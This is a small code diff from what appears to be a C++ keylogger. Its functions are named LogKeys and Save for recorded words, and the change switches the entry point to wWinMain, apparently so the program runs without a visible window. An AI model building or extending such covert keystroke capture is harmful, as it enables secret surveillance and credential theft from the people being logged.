@@ -18,8 +18,8 @@ enum CoreState
 void Save(std::unordered_map<std::string, unsigned int>* confirmedWords);
 CoreState LogKeys(std::string* bufferHandle);
 
-//int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
-int main()
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
+//int main()
 {
 	std::unordered_map<std::string, unsigned int> confirmedWords;
 
